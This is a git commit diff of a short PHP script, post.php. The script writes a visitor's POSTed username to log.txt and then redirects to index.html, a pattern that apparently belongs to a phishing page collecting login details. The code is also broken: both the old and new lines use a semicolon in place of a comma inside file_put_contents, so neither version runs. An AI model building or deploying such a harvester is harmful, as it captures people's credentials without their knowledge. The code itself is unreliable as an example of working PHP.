8c03e43cb34bbb8002c01e5dec52ea65c18909e2
ig-loc <sup.sadr.org@gmail.com>
2025-01-14 02:09:25 +0330

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,6 @@
 <?php
 
-    file_put_contents("log.txt", "[👤]  Username :  ".$_POST['username']."\n"; FILE_APPEND);
+    file_put_contents("log.txt", "[👤]  Username :  ".$_POST['username']."\n";
+FILE_APPEND);
 header('Location: index.html');
 exit();
